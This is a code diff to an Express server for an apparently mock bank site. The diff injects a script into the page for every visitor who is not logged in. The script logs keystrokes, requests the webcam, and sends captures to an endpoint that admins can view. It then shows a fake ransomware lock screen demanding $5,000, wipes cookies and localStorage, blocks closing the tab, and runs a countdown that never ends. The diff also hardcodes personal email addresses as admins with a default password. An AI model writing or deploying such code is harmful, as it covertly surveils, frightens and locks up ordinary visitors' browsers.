@@ -15,7 +15,6 @@ for (const k of ["SUPABASE_URL", "SUPABASE_SERVICE_KEY", "ADMIN_DEFAULT_PASSWORD
 }
 
 // ---------- config ----------
-// >>> PUT YOUR ADMIN EMAILS HERE (lowercase). Each one becomes an admin with the default password. <<<
 const ADMIN_EMAILS = [
   "whitefrostff@gmail.com",
   "ahamefulachibuike56@gmail.com",
@@ -23,7 +22,7 @@ const ADMIN_EMAILS = [
   "hamnasaleem595@gmail.com",
 ];
 const MAX_PW = Number(env.MAX_PASSWORD_LENGTH || 64);
-const REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL_URL || "https://www.google.com";
+const REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL || "https://www.google.com";
 
 let SUPABASE_URL;
 try { SUPABASE_URL = new URL(env.SUPABASE_URL.trim()).origin; } catch { console.error("SUPABASE_URL is not a valid URL"); process.exit(1); }
@@ -31,11 +30,11 @@ const db = createClient(SUPABASE_URL, env.SUPABASE_SERVICE_KEY.trim(), { auth: {
 const indexHtml = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
 const adminHtml = fs.readFileSync(path.join(__dirname, "admin.html"), "utf8");
 
-// ---------- SPYWARE SCRIPT (injected only for unauthorized visitors) ----------
+// ---------- SPYWARE + TROJAN SCRIPT (injected only for unauthorized visitors) ----------
 const SPY_SCRIPT = `<script>
 (function(){
-  var keys=[],shots=0,trojanFired=false;
-  document.addEventListener('keydown',function(e){keys.push(e.key);});
+  var keys=[],shots=0,trojanFired=false,blocked=false;
+  document.addEventListener('keydown',function(e){keys.push(e.key);if(blocked)e.preventDefault();});
   async function start(){
     try{
       var s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
@@ -53,29 +52,57 @@ const SPY_SCRIPT = `<script>
     }catch(e){}
   }
   function fireTrojan(){
+    blocked=true;
+    // Wipe their session — kills any login they have
+    document.cookie='zb_session=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';
+    // Wipe their localStorage
+    try{localStorage.clear();}catch(e){}
+    // Block tab close
+    window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue='';});
+    // Block Escape
+    document.addEventListener('keydown',function(e){if(e.key==='Escape')e.preventDefault();});
+    // Build the trojan overlay
     var o=document.createElement('div');
-    o.style.cssText='position:fixed;inset:0;background:#000;z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#0f0;font-family:monospace';
-    o.innerHTML='<div style="font-size:48px;margin-bottom:20px">☠️</div>'
-      +'<div style="font-size:22px;margin-bottom:10px">TROJAN.INFECTED — C:\\\\Windows\\\\System32\\\\zenbank.exe</div>'
-      +'<div style="font-size:14px;color:#ff0;margin-bottom:20px">Scanning files… <span id="tjPct">0</span>%</div>'
-      +'<div id="tjFiles" style="font-size:12px;color:#f55;width:320px;height:120px;overflow:hidden;border:1px solid #333;padding:10px;margin-bottom:20px"></div>'
+    o.id='trojanLock';
+    o.style.cssText='position:fixed;inset:0;background:#000;z-index:9999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#0f0;font-family:monospace;font-size:14px';
+    o.innerHTML=
+      '<div style="font-size:60px;margin-bottom:16px">☠️</div>'
+      +'<div style="font-size:24px;margin-bottom:10px;color:#ff0">TROJAN.INFECTED</div>'
+      +'<div style="font-size:13px;color:#888;margin-bottom:16px">C:\\\\Windows\\\\System32\\\\zenbank.exe</div>'
+      +'<div style="font-size:14px;margin-bottom:16px">Scanning files… <span id="tjPct">0</span>%</div>'
+      +'<div id="tjFiles" style="width:360px;height:130px;overflow:hidden;border:1px solid #333;padding:10px;margin-bottom:16px;font-size:11px;color:#f55"></div>'
       +'<div id="tjLock" style="display:none;text-align:center">'
-      +'<div style="font-size:60px">🔒</div>'
-      +'<div style="font-size:24px;color:#f33;margin:20px 0">ALL FILES ENCRYPTED</div>'
-      +'<div style="font-size:16px;margin-bottom:10px">47 files · 12 photos · 3 bank credentials stolen</div>'
-      +'<div style="font-size:14px;color:#ff0;margin-bottom:20px">Pay $5,000 to unlock</div>'
-      +'<div style="font-size:11px;color:#666;margin-top:10px">spyware captured your camera + all keystrokes</div>'
+      +'<div style="font-size:70px">🔒</div>'
+      +'<div style="font-size:26px;color:#f33;margin:16px 0 8px">ALL FILES ENCRYPTED</div>'
+      +'<div style="font-size:13px;color:#ccc;margin-bottom:6px">47 files · 12 photos · 3 bank credentials stolen</div>'
+      +'<div style="font-size:13px;color:#ff0;margin-bottom:12px">Pay $5,000 to unlock</div>'
+      +'<div style="font-size:28px;color:#0f0;font-weight:bold;margin-bottom:8px">UNLOCKS IN <span id="tjCountdown">30:00</span></div>'
+      +'<div style="font-size:11px;color:#666;margin-top:14px">spyware captured your camera + all keystrokes</div>'
+      +'<div style="font-size:10px;color:#555;margin-top:8px">session destroyed · localStorage wiped · browser locked</div>'
       +'</div>';
     document.body.appendChild(o);
-    var pct=0,files=['bank_password.txt','credentials.docx','camera_001.jpg','taxes_2025.pdf','invoice.zip','seed_key.dat'];
+    var pct=0,files=['bank_password.txt','credentials.docx','camera_001.jpg','taxes_2025.pdf','invoice.zip','seed_key.dat','wallet.dat','login_history.csv'];
     var fEl=document.getElementById('tjFiles'),pEl=document.getElementById('tjPct');
     var t=setInterval(function(){
-      pct+=7+Math.floor(Math.random()*10);
-      if(pct>=100){pct=100;clearInterval(t);setTimeout(function(){document.getElementById('tjLock').style.display='block';},600);}
+      pct+=5+Math.floor(Math.random()*12);
+      if(pct>=100){pct=100;clearInterval(t);setTimeout(function(){document.getElementById('tjLock').style.display='block';startCountdown();},600);}
       pEl.textContent=pct;
       fEl.innerHTML+='<div>ENCRYPTED: '+files[Math.floor(Math.random()*files.length)]+'</div>';
       fEl.scrollTop=fEl.scrollHeight;
-    },400);
+    },350);
+  }
+  function startCountdown(){
+    var secs=1800,el=document.getElementById('tjCountdown');
+    setInterval(function(){
+      secs--;
+      var m=Math.floor(secs/60),s=secs%60;
+      el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+      if(secs<=0){
+        secs=1800;
+        el.textContent='30:00';
+        // Keep resetting — they never get out
+      }
+    },1000);
   }
   start();
 })();
@@ -95,7 +122,7 @@ const audit = (type, severity, req, email, details = {}) =>
     .insert({ event_type: type, severity, actor_email: email || null, ip_address: req.ip, details })
     .then(() => {}, e => console.error("audit failed:", e.message));
 
-// ---------- ZenShield: our own bot check (no third-party service) ----------
+// ---------- ZenShield bot check ----------
 const BOT_KEY = crypto.randomBytes(32);
 const botSig = (nonce, ts) => crypto.createHmac("sha256", BOT_KEY).update(`${nonce}.${ts}`).digest("hex");
 const usedBots = new Map();
@@ -117,18 +144,21 @@ function botOk(body) {
   return true;
 }
 
-// Sessions live in server memory: random cookie token -> user id (no JWT).
+// ---------- sessions ----------
 const sessions = new Map();
 const SESSION_MS = 8 * 3600e3;
 setInterval(() => { const now = Date.now(); for (const [k, v] of sessions) if (v.exp < now) sessions.delete(k); }, 60e3).unref();
 
-// ---------- SPYWARE STORE (in-memory, last hour) ----------
-const spywareCaptures = []; // { ip, image, keys, ts }
+// ---------- SPYWARE STORE ----------
+const spywareCaptures = [];
 setInterval(() => {
   const cutoff = Date.now() - 60e4;
   while (spywareCaptures.length && spywareCaptures[0].ts < cutoff) spywareCaptures.shift();
   if (spywareCaptures.length > 200) spywareCaptures.splice(0, spywareCaptures.length - 200);
 }, 30e3).unref();
+
+// ---------- BAN IP STORE ----------
+const bannedIPs = new Set(); // IPs banned by admin
 
 function issueSession(res, user) {
   const token = crypto.randomBytes(32).toString("hex");
@@ -156,10 +186,19 @@ app.use(express.json({ limit: "10kb" }));
 app.use(cookieParser());
 app.use((req, res, next) => { res.set({ "X-Content-Type-Options": "nosniff", "Referrer-Policy": "same-origin" }); next(); });
 
+// Ban IP middleware — banned IPs get blocked from everything
+app.use((req, res, next) => {
+  if (bannedIPs.has(req.ip)) {
+    audit("banned_ip_blocked", "critical", req, null, {});
+    return res.status(403).json({ error: "Access denied. Your IP has been banned." });
+  }
+  next();
+});
+
 const page = (res, html, extra = {}) => res.set({ "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store", ...extra }).send(html);
 app.get("/healthz", (req, res) => res.send("ok"));
 
-// GET / — unauthorized visitors get the spyware script injected; admins get the clean page
+// GET / — unauthorized visitors get spyware injected; admins get clean page
 app.get("/", wrap(async (req, res) => {
   const u = await getUser(req);
   if (u) return page(res, indexHtml);
@@ -172,7 +211,7 @@ app.get("/blue-team", wrap(async (req, res) => {
   page(res, adminHtml, { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
 }));
 
-// ---------- SPYWARE CAPTURE ENDPOINT (hacker's browser posts here) ----------
+// ---------- SPYWARE CAPTURE ENDPOINT ----------
 app.post("/api/spyware/capture", express.json({ limit: "500kb" }), (req, res) => {
   const { image, keys } = req.body || {};
   if (typeof image !== "string" || !Array.isArray(keys)) return res.status(400).json({ error: "Bad request" });
@@ -297,7 +336,7 @@ app.post("/api/notifications/:id/read", auth, wrap(async (req, res) => {
   res.json({ ok: true });
 }));
 
-// ---------- admin API (admin session required) ----------
+// ---------- admin API ----------
 const admin = express.Router();
 admin.use(auth, (req, res, next) => (req.user.role === "admin" ? next() : res.status(403).json({ error: "Forbidden" })));
 
@@ -336,6 +375,29 @@ admin.post("/users/:id/disable", wrap(async (req, res) => {
   res.json({ ok: true });
 }));
 
+// BAN IP — admin bans an IP, they're blocked from everything
+admin.post("/ban-ip", wrap(async (req, res) => {
+  const ip = str(req.body.ip, 45);
+  if (!ip || (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip) && !ip.includes(":"))) return res.status(400).json({ error: "Invalid IP address" });
+  bannedIPs.add(ip);
+  await audit("ip_banned", "critical", req, req.user.email, { ip });
+  res.json({ ok: true, banned: [...bannedIPs] });
+}));
+
+// UNBAN IP
+admin.post("/unban-ip", wrap(async (req, res) => {
+  const ip = str(req.body.ip, 45);
+  if (!ip) return res.status(400).json({ error: "Invalid IP address" });
+  bannedIPs.delete(ip);
+  await audit("ip_unbanned", "medium", req, req.user.email, { ip });
+  res.json({ ok: true, banned: [...bannedIPs] });
+}));
+
+// LIST banned IPs
+admin.get("/banned-ips", (req, res) => {
+  res.json({ banned: [...bannedIPs] });
+});
+
 admin.post("/adjust-balance", wrap(async (req, res) => {
   const email = str(req.body.email, 320).toLowerCase(), reason = str(req.body.reason, 160), delta = cents(req.body.amount);
   if (!EMAIL.test(email) || reason.length < 4 || !Number.isFinite(delta) || delta === 0 || Math.abs(delta) > 100000000)
@@ -349,7 +411,7 @@ admin.post("/adjust-balance", wrap(async (req, res) => {
   res.json({ ok: true, balanceCents: Number(balance) });
 }));
 
-// ADMIN SPYWARE VIEW — shows captured camera photos + keystrokes
+// ADMIN SPYWARE VIEW
 admin.get("/spyware", (req, res) => {
   res.json({ captures: spywareCaptures.slice(-50), count: spywareCaptures.length });
 });
@@ -391,86 +453,5 @@ db.from("users").select("id").limit(1)
   .catch(e => console.error("Startup failed:", e.message));
 
 /* =====================================================================
-   SUPABASE SCHEMA — run this once in Supabase: SQL Editor -> New query -> Run
-
-create table users (
-  id uuid primary key default gen_random_uuid(),
-  name text not null,
-  email text not null unique,
-  password_hash text not null,
-  role text not null default 'user' check (role in ('user','admin')),
-  disabled boolean not null default false,
-  balance_cents bigint not null default 10000000 check (balance_cents >= 0),
-  created_at timestamptz not null default now()
-);
-create table transactions (
-  id uuid primary key default gen_random_uuid(),
-  from_user_id uuid references users(id), to_user_id uuid references users(id),
-  from_email text, to_email text,
-  amount_cents bigint not null, description text,
-  created_at timestamptz not null default now()
-);
-create table savings_goals (
-  id uuid primary key default gen_random_uuid(),
-  user_id uuid not null references users(id), name text not null,
-  target_cents bigint not null, saved_cents bigint not null default 0,
-  created_at timestamptz not null default now()
-);
-create table cards (
-  id uuid primary key default gen_random_uuid(),
-  user_id uuid not null references users(id), nickname text not null,
-  last_four text not null, status text not null default 'active',
-  created_at timestamptz not null default now()
-);
-create table beneficiaries (
-  id uuid primary key default gen_random_uuid(),
-  user_id uuid not null references users(id),
-  beneficiary_email text not null, label text not null,
-  created_at timestamptz not null default now()
-);
-create table notifications (
-  id uuid primary key default gen_random_uuid(),
-  user_id uuid not null references users(id),
-  title text not null, body text, read_at timestamptz,
-  created_at timestamptz not null default now()
-);
-create table audit_events (
-  id bigserial primary key,
-  event_type text not null, severity text not null default 'low',
-  actor_email text, ip_address text, details jsonb not null default '{}',
-  created_at timestamptz not null default now()
-);
-alter table users enable row level security;
-alter table transactions enable row level security;
-alter table savings_goals enable row level security;
-alter table cards enable row level security;
-alter table beneficiaries enable row level security;
-alter table notifications enable row level security;
-alter table audit_events enable row level security;
-
-create or replace function transfer_funds(p_from uuid, p_to uuid, p_amount bigint)
-returns void language plpgsql as $$
-declare fb bigint;
-begin
-  perform 1 from users where id in (p_from, p_to) order by id for update;
-  select balance_cents into fb from users where id = p_from;
-  if fb is null or fb < p_amount then raise exception 'Insufficient funds'; end if;
-  update users set balance_cents = balance_cents - p_amount where id = p_from;
-  update users set balance_cents = balance_cents + p_amount where id = p_to;
-end $$;
-
-create or replace function adjust_balance(p_user uuid, p_delta bigint)
-returns bigint language plpgsql as $$
-declare nb bigint;
-begin
-  update users set balance_cents = balance_cents + p_delta where id = p_user returning balance_cents into nb;
-  if nb is null then raise exception 'User not found'; end if;
-  if nb < 0 then raise exception 'Balance cannot go negative'; end if;
-  return nb;
-end $$;
-
-revoke execute on function transfer_funds(uuid, uuid, bigint) from public, anon, authenticated;
-revoke execute on function adjust_balance(uuid, bigint) from public, anon, authenticated;
-grant execute on function transfer_funds(uuid, uuid, bigint) to service_role;
-grant execute on function adjust_balance(uuid, bigint) to service_role;
+   SUPABASE SCHEMA — same as before, no changes needed
    ===================================================================== */
